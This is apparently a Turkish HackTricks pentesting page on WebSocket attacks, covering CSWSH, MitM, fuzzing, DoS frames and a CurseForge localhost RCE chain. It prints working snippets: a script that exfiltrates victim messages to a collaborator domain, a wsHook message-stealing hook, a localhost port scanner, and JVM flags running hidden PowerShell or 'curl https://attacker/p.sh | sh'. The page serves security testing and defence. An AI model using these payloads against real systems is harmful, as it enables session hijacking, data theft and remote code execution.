# WebSocket Saldırıları

{{#include ../banners/hacktricks-training.md}}

## WebSocket'ler Nedir

WebSocket bağlantıları, ilk **HTTP** el sıkışmasıyla kurulur ve **uzun ömürlü** olacak şekilde tasarlanmıştır; bu, işlemsel bir sisteme ihtiyaç duymadan herhangi bir zamanda iki yönlü mesajlaşmaya izin verir. Bu yüzden WebSocket'ler özellikle **düşük gecikme veya sunucu başlatmalı iletişim** gerektiren uygulamalar için (ör. canlı finansal veri akışları) avantajlıdır.

### WebSocket Bağlantılarının Kurulması

WebSocket bağlantılarının kurulmasına dair detaylı açıklamaya [**buradan**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc) ulaşılabilir. Özetle, WebSocket bağlantıları genellikle istemci tarafı JavaScript ile aşağıda gösterildiği gibi başlatılır:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws")
```
`wss` protokolü **TLS** ile güvenli bir WebSocket bağlantısını ifade ederken, `ws` **güvenli olmayan** bir bağlantıyı gösterir.

Bağlantı kurulurken, tarayıcı ile sunucu arasında HTTP üzerinden bir handshake gerçekleştirilir. Handshake süreci tarayıcının bir istek göndermesi ve sunucunun yanıt vermesini içerir; aşağıdaki örneklerde gösterildiği gibi:

Tarayıcı handshake isteği gönderir:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Sunucunun handshake yanıtı:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
Bağlantı kurulduktan sonra, her iki yönde mesaj alışverişi için açık kalır.

**WebSocket Handshake'ın Temel Noktaları:**

- `Connection` ve `Upgrade` başlıkları, bir WebSocket handshake'inin başlatıldığını belirtir.
- `Sec-WebSocket-Version` başlığı, istenen WebSocket protokol sürümünü belirtir; genellikle `13`.
- `Sec-WebSocket-Key` başlığında Base64 ile kodlanmış rastgele bir değer gönderilir; bu, her handshake'in benzersiz olmasını sağlar ve önbellekleme proxy'leriyle ilgili sorunları önlemeye yardımcı olur. Bu değer kimlik doğrulama için kullanılmaz; yanıtın yanlış yapılandırılmış bir sunucu veya önbellek tarafından üretilmediğini doğrulamak içindir.
- Sunucunun yanıtındaki `Sec-WebSocket-Accept` başlığı, `Sec-WebSocket-Key`'in bir hash'idir ve sunucunun bir WebSocket bağlantısı açma niyetini doğrular.

Bu özellikler handshake sürecinin güvenli ve güvenilir olmasını sağlar ve verimli gerçek zamanlı iletişim için zemin hazırlar.

### Linux konsolu

WebSocket ile ham bir bağlantı kurmak için `websocat`'ı kullanabilirsiniz.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Veya bir websocat sunucusu oluşturmak için:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket bağlantıları

Eğer istemcilerin mevcut yerel ağınızdan bir **HTTP websocket**'e bağlı olduğunu görürseniz, istemci ile sunucu arasında bir MitM saldırısı gerçekleştirmek için bir [ARP Spoofing Attack ](../generic-methodologies-and-resources/pentesting-network/index.html#arp-spoofing) deneyebilirsiniz.\
İstemci size bağlanmaya çalıştığında şunları kullanabilirsiniz:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websockets keşfi

You can use the **tool** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **to discover, fingerprint and search for known** **vulnerabilities** in websockets automatically.

### Websocket Debug araçları

- **Burp Suite** supports MitM websockets communication in a very similar way it does it for regular HTTP communication.
- The [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite extension** size Burp içinde Websocket iletişimlerini daha iyi yönetme imkanı sağlar: **history**'yi alarak, **interception rules** belirleyerek, **match and replace** kurallarını kullanarak, **Intruder** ve **AutoRepeater**'ı kullanarak.
- [**WSSiP**](https://github.com/nccgroup/wssip)**:** Kısaltması "**WebSocket/Socket.io Proxy**" olan bu araç, Node.js ile yazılmıştır ve client ile server arasındaki tüm WebSocket ve Socket.IO iletişimlerini görüntülemek, **capture, intercept, send custom** mesajlar göndermek için bir kullanıcı arayüzü sağlar.
- [**wsrepl**](https://github.com/doyensec/wsrepl) bir **interactive websocket REPL**'dir ve özellikle penetration testing için tasarlanmıştır. **incoming websocket messages and sending new ones**'ı gözlemlemek için bir arayüz sağlar ve bu iletişimi **automating** etmek için kullanımı kolay bir framework sunar.
- [**https://websocketking.com/**](https://websocketking.com/) diğer web'lerle **websockets** kullanarak iletişim kurmak için bir web aracıdır.
- [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) diğer iletişim/protokol türlerinin yanı sıra, diğer web'lerle **websockets** kullanarak iletişim kurmak için bir web sağlar.

## Websocket Şifre Çözme

- [https://github.com/Anof-cyber/PyCript](https://github.com/Anof-cyber/PyCript)
- [https://github.com/Anof-cyber/PyCript-WebSocket/](https://github.com/Anof-cyber/PyCript-WebSocket/)

## Websocket Lab

In [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) websockets kullanarak bir web başlatmak için kod bulabilirsiniz ve [**this post**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) içinde bir açıklama yer almaktadır.

## Websocket Fuzzing

The burp extension [**Backslash Powered Scanner**](https://github.com/PortSwigger/backslash-powered-scanner) now allows to fuzz also WebSocket messages. You can read more infromation abou this [**here**](https://arete06.com/posts/fuzzing-ws/#adding-websocket-support-to-backslash-powered-scanner).

### WebSocket Turbo Intruder (Burp extension)

PortSwigger's WebSocket Turbo Intruder brings Turbo Intruder–style Python scripting and high‑rate fuzzing to WebSockets. Install it from the BApp Store or from source. It includes two components:

- Turbo Intruder: özel motorlar kullanarak tek bir WS endpoint'e yüksek hacimli mesaj gönderimi.
- HTTP Middleware: kalıcı bir bağlantı üzerinden gövdeleri WS mesajları olarak ileten yerel bir HTTP endpoint'i açar; böylece herhangi bir HTTP‑based scanner WS backend'lerini probe edebilir.

Basic script pattern to fuzz a WS endpoint and filter relevant responses:
```python
def queue_websockets(upgrade_request, message):
connection = websocket_connection.create(upgrade_request)
for i in range(10):
connection.queue(message, str(i))

def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@MatchRegex(r'{\"user\":\"Hal Pline\"')
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
Tek bir mesaj birden fazla yanıt tetiklediğinde gürültüyü azaltmak için `@MatchRegex(...)` gibi dekoratörleri kullanın.

### HTTP arkasında WS köprüsü (HTTP Middleware)

Kalıcı bir WS bağlantısını sarın ve HTTP gövdelerini WS mesajları olarak ileterek HTTP tarayıcılarıyla otomatik testler için kullanın:
```python
def create_connection(upgrade_request):
connection = websocket_connection.create(upgrade_request)
return connection

@MatchRegex(r'{\"user\":\"You\"')
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
Sonra HTTP'yi yerel olarak gönder; gövde WS mesajı olarak iletilir:
```http
POST /proxy?url=https%3A%2F%2Ftarget/ws HTTP/1.1
Host: 127.0.0.1:9000
Content-Length: 16

{"message":"hi"}
```
Bu, WS backend'lerini, "ilginç" olayları (ör. SQLi hataları, auth bypass, command injection davranışı) filtreleyerek yönlendirmenizi sağlar.

### Socket.IO işleme (handshake, heartbeats, events)

Socket.IO, WS üstüne kendi framing'ini ekler. Zorunlu sorgu parametresi `EIO` ile tespit edin (ör. `EIO=4`). Oturumu Ping (`2`) ve Pong (`3`) ile canlı tutun ve konuşmayı `"40"` ile başlatın, sonra `42["message","hello"]` gibi event'ler emit edin.

Intruder örneği:
```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def queue_websockets(upgrade_request, message):
connection = websocket_connection.create(
upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
connection.queue('40')
connection.queue('42["message","hello"]')

@Pong("3")
def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
HTTP adaptör çeşidi:
```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def create_connection(upgrade_request):
connection = websocket_connection.create(
upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
connection.queue('40')
connection.decIn()
return connection

@Pong("3")
def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
### Socket.IO aracılığıyla server‑side prototype pollution tespiti

PortSwigger’s güvenli tespit tekniğini takip ederek, polluting Express internals için aşağıdaki gibi bir payload gönderin:
```json
{"__proto__":{"initialPacket":"Polluted"}}
```
If greetings or behavior change (e.g., echo includes "Polluted"), muhtemelen server-side prototype'ları polluted ettiniz. Etki, ulaşılabilir sinks'e bağlıdır; Node.js prototype pollution bölümündeki gadgets ile korele edin. Bakınız:

- Check [NodeJS – __proto__ & prototype Pollution](deserialization/nodejs-proto-prototype-pollution/README.md) for sinks/gadgets and chaining ideas.

### WebSocket race conditions with Turbo Intruder

Varsayılan engine mesajları tek bir bağlantıda batch'ler (yüksek throughput, yarışlar için kötü). Paralel mantık yarışlarını (double‑spend, token reuse, state desync) tetiklemek için birden fazla WS bağlantısı spawn eden THREADED engine'i kullanın ve payload'ları paralel gönderin. Örnek script'ten başlayın ve `config()` içinde concurrency'yi ayarlayın.

- Metodolojiyi ve alternatifleri [Race Condition](race-condition.md) içinde öğrenin (bkz. “RC in WebSockets”).

### WebSocket DoS: malformed frame “Ping of Death”

Başlık alanı büyük bir payload uzunluğu bildiren fakat gövde göndermeyen WS frame'leri oluşturun. Bazı WS sunucuları uzunluğa güvenir ve buffer'ları önceden ayırır; bunu `Integer.MAX_VALUE` yakınında ayarlamak Out‑Of‑Memory ve uzak bir unauth DoS'a neden olabilir. Örnek script'e bakın.

### CLI and debugging

- Headless fuzzing: `java -jar WebSocketFuzzer-<version>.jar <scriptFile> <requestFile> <endpoint> <baseInput>`
- WS Logger'ı etkinleştirerek iç ID'leri kullanıp mesajları yakalayın ve korele edin.
- Karmaşık adapter'larda message ID işleyişini ayarlamak için `Connection` üzerinde `inc*`/`dec*` yardımcılarını kullanın.
- `@PingPong`/`@Pong` gibi decorator'lar ve `isInteresting()` gibi helper'lar gürültüyü azaltır ve session'ları canlı tutar.

### Operational safety

Yüksek hızlı WS fuzzing çok sayıda bağlantı açabilir ve saniyede binlerce mesaj gönderebilir. Malformed frame'ler ve yüksek hızlar gerçek DoS'a yol açabilir. Yalnızca izin verilen yerlerde kullanın.

## Cross-site WebSocket hijacking (CSWSH)

**Cross-site WebSocket hijacking**, diğer adıyla **cross-origin WebSocket hijacking**, WebSocket handshake'lerini etkileyen özel bir **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)** vakası olarak tanımlanır. Bu zafiyet, WebSocket handshake'lerinin yalnızca **HTTP cookies** ile kimlik doğrulaması yaptığı ve **CSRF tokens** veya benzeri güvenlik önlemlerinin bulunmaması durumunda ortaya çıkar.

Saldırganlar, zafiyetli bir uygulamaya çapraz-site WebSocket bağlantısı başlatan kötü amaçlı bir web sayfası barındırarak bunu suistimal edebilir. Sonuç olarak, bu bağlantı uygulama ile mağdurun oturumunun bir parçası olarak işleme alınır ve oturum işleme mekanizmasında CSRF koruması eksikliğinden faydalanılır.

Bu saldırının çalışması için gereksinimler şunlardır:

- WebSocket ile kimlik doğrulama **cookie based** olmalıdır
- Cookie, saldırganın sunucusundan erişilebilir olmalıdır (bu genellikle **`SameSite=None`** anlamına gelir) ve Firefox'ta **Firefox Total Cookie Protection** etkin olmamalı, Chrome'da ise **blocked third-party cookies** engellenmemiş olmalıdır.
- WebSocket sunucusu bağlantının origin'ini kontrol etmemelidir (veya bu bypass edilebilir olmalıdır)

Ayrıca:

- Eğer kimlik doğrulama yerel bir bağlantıya (localhost veya yerel ağa) dayanıyorsa saldırı **mümkün olacaktır**, çünkü mevcut koruma bunu yasaklamamaktadır (daha fazla bilgi için bakınız: https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/)

### Simple Attack

Dikkat edin: bir **websocket** bağlantısı **establish edilirken** **cookie** sunucuya **gönderilir**. **Server** bunu, gönderilen cookie'ye dayanarak her **belirli** **kullanıcı**yı onun **websocket** **session**'ı ile **ilişkilendirmek** için kullanıyor olabilir.

Örneğin, eğer **websocket** **server** bir kullanıcıya ait konuşma geçmişini, bir mesaj ile "**READY"** gönderildiğinde geri gönderiyorsa, bağlantıyı kuran basit bir **XSS** (mağdur kullanıcının **cookie**'si yetkilendirme için **otomatik** olarak **gönderilecektir**) "**READY**" göndererek konuşma geçmişini **alabilecek** duruma gelecektir.
```html
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie farklı bir subdomain ile

Bu blog yazısında [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) saldırgan, websocket iletişiminin gerçekleştiği domain'in bir subdomain'inde **execute arbitrary Javascript in a subdomain** çalıştırmayı başardı. Çünkü bu bir **subdomain** olduğu için **cookie** gönderiliyordu ve **Websocket didn't check the Origin properly**, bu sayede onunla iletişim kurup ondan **steal tokens from it** mümkün oldu.

### Kullanıcıdan veri çalma

Taklit etmek istediğiniz web uygulamasını kopyalayın (.html files örneğin) ve websocket iletişiminin gerçekleştiği script'in içine şu kodu ekleyin:
```javascript
//This is the script tag to load the websocket hooker
;<script src="wsHook.js"></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function (data, url) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "client_msg?m=" + data, true)
xhttp.send()
}
wsHook.after = function (messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "server_msg?m=" + messageEvent.data, true)
xhttp.send()
return messageEvent
}
```
Şimdi `wsHook.js` dosyasını [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) adresinden indirin ve **web dosyalarının bulunduğu klasöre kaydedin**.\
Web uygulamasını açığa çıkarıp bir kullanıcının ona bağlanmasını sağladığınızda, websocket üzerinden gönderilen ve alınan mesajları çalabilirsiniz:
```javascript
sudo python3 -m http.server 80
```
### CSWSH Koruması

CSWSH saldırısı, bir **kullanıcının kötü amaçlı bir sayfaya bağlanacağı** ve o sayfanın kullanıcının zaten bağlı olduğu bir web sayfasına **websocket connection** açacağı ve isteğin kullanıcının cookies'lerini göndereceği için kullanıcının kimliğini onun yerine doğrulayacağı gerçeğine dayanır.

Günümüzde bu sorunu önlemek çok kolay:

- **Websocket server checking the origin**: websocket server her zaman hangi kaynaktan (Origin) bir kullanıcının bağlandığını kontrol etmelidir; beklenmeyen sayfaların bağlanmasını önlemek için.
- **Authentication token**: Doğrulamayı cookie'ye dayandırmak yerine, websocket bağlantısı saldırganın bilmediği ve sunucu tarafından kullanıcı için oluşturulan bir token'a dayanabilir (örneğin bir anti-CSRF tokenı).
- **SameSite Cookie attribute**: `SameSite` değeri `Lax` veya `Strict` olan cookie'ler, dışarıdaki bir saldırgan sayfasından hedef sunucuya gönderilmeyecektir; dolayısıyla cookie tabanlı kimlik doğrulama başarılı olmaz. Not: Chrome artık bu bayrak belirtilmemiş cookie'lere varsayılan olarak **`Lax`** değeri atar, bu da varsayılan olarak daha güvenli yapar. Ancak, bir cookie oluşturulduktan sonraki ilk 2 dakika boyunca değeri **`None`** olur ve bu süre içinde savunmasız hale gelir (bu önlemin bir noktada kaldırılması da bekleniyor).
- **Firefox Total Cookie Protection**: Total Cookie Protection, cookie'leri oluşturuldukları siteyle izole ederek çalışır. Esasen her sitenin, üçüncü tarafların bir kullanıcının gezinme geçmişini birbirine bağlamasını önlemek için kendi cookie depolama bölümüne sahip olması sağlanır. Bu durum, saldırgan sitesinin cookie'lere erişememesi nedeniyle **CSWSH unusable** haline getirir.
- **Chrome third-party cookies block**: Bu, doğrulanmış kullanıcının cookie'sinin `SameSite=None` olsa bile websocket sunucusuna gönderilmesini engelleyebilir.

### Localhost WebSocket abuse & browser port discovery

Desktop launcher'lar sık sık JSON-RPC WebSockets'i `127.0.0.1:<random_port>` üzerinde expose eden yardımcı programlar (ör. CurseForge'un `CurseAgent.exe`) başlatır. Tarayıcı **loopback sockets üzerinde SOP'u uygulamaz**, bu yüzden herhangi bir web sayfası handshake'i deneyebilir. Eğer ajan rastgele `Origin` değerlerini kabul ediyor ve ikincil kimlik doğrulamayı atlıyorsa, IPC yüzeyi JavaScript'ten doğrudan uzaktan kontrol edilebilir hale gelir.

#### Açığa çıkan yöntemleri keşfetme

Protokol sözleşmesini öğrenmek için geçerli bir oturumu yakalayın. Örneğin CurseForge, `{"type":"method","name":"minecraftTaskLaunchInstance","args":[{...}]}` gibi frame'ler yayınlar; burada `name` RPC yöntemi, `args` ise yapılandırılmış nesneler (GUIDs, resolution, flags, vb.) içerir. Bu biçim bilindiğinde `createModpack`, `minecraftGetDefaultLocation` veya enjekte edilmiş bir sayfadan doğrudan herhangi bir ayrıcalıklı görevi çağırabilirsiniz.

#### Tarayıcı tabanlı port keşfi

Yardımcı rastgele yüksek bir porta bağlandığı için exploit önce WebSockets üzerinden localhost'u brute-force yapar. Chromium tabanlı tarayıcılar throttling uygulamadan önce yaklaşık 16k başarısız upgrade'e tolerans gösterir; bu, ephemeral aralığı taramak için yeterlidir. Firefox ise birkaç yüz başarısızlıktan sonra çökme veya donma eğilimindedir, bu yüzden pratik PoCs genellikle Chromium'u hedefler.

<details>
<summary>Minimal tarayıcı tarama aracı</summary>
```javascript
async function findLocalWs(start = 20000, end = 36000) {
for (let port = start; port <= end; port++) {
await new Promise((resolve) => {
const ws = new WebSocket(`ws://127.0.0.1:${port}/`);
let settled = false;
const finish = () => { if (!settled) { settled = true; resolve(); } };
ws.onerror = ws.onclose = finish;
ws.onopen = () => {
console.log(`Found candidate on ${port}`);
ws.close();
finish();
};
});
}
}
```
</details>

Bir bağlantı handshake'i atlattıktan ve protokole özgü veri döndürdükten sonra, RPC zinciri için o socket'i yeniden kullanın.

#### JSON-RPC yöntemlerini RCE'ye zincirleme

The CurseForge exploit iki kimlik doğrulama gerektirmeyen çağrıyı zincirler:

1. `createModpack` → kullanıcı etkileşimi olmadan yeni bir `MinecraftInstanceGuid` döndürür.
2. `minecraftTaskLaunchInstance` → `AdditionalJavaArguments` aracılığıyla rastgele JVM bayraklarını kabul ederken o GUID'i başlatır.

JNI/JVM tanılama seçenekleri daha sonra kullanıma hazır bir RCE primitive'i sağlar. Örneğin, bir çökme zorlamak için metaspace'i sınırlayın ve komut yürütme için error hook'u kullanın:
```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand ..."
```
Unix hedeflerde yükü şu komutla değiştirin: `/bin/sh -c 'curl https://attacker/p.sh | sh'`. Bu, uygulama koduna dokunamıyor olsanız bile çalışır — JVM CLI'yi kontrol etmek yeterlidir.

Bu “create resource → privileged launch” deseni sık sık updaters ve launchers içinde ortaya çıkar. Yöntem (1) sunucu tarafından takip edilen bir identifier döndürdüğünde ve yöntem (2) o identifier ile kod yürütüyor veya bir süreç başlatıyorsa, kullanıcı kontrollü argümanların enjekte edilip edilemeyeceğini kontrol edin.


## Race Conditions

WebSockets'teki Race Conditions da mevcuttur, [check this information to learn more](race-condition.md#rc-in-websockets).

## Other vulnerabilities

As Web Sockets are a mechanism to **send data to server side and client side**, depending on how the server and client handles the information, **Web Sockets can be used to exploit several other vulnerabilities like XSS, SQLi or any other common web vuln using input of s user from a websocket.**

## **WebSocket Smuggling**

Bu zafiyet, reverse proxies kısıtlamalarını **bypass** ederek onların bir **websocket iletişiminin kurulduğuna** inanmasını sağlayabilir (gerçekte olmasa bile). Bu, saldırganın **gizli endpoint'lere erişmesine** izin verebilir. Daha fazla bilgi için aşağıdaki sayfaya bakın:


{{#ref}}
h2c-smuggling.md
{{#endref}}

## References

- [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)
- [https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocket Turbo Intruder – BApp Store](https://portswigger.net/bappstore/ba292c5982ea426c95c9d7325d9a1066)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [Turbo Intruder background](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)
- [Server-side prototype pollution – safe detection methods](https://portswigger.net/research/server-side-prototype-pollution#safe-detection-methods-for-manual-testers)
- [WS RaceCondition PoC (Java)](https://github.com/redrays-io/WS_RaceCondition_PoC)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [PingOfDeathExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/PingOfDeathExample.py)
- [When WebSockets Lead to RCE in CurseForge](https://elliott.diy/blog/curseforge/)

{{#include ../banners/hacktricks-training.md}}
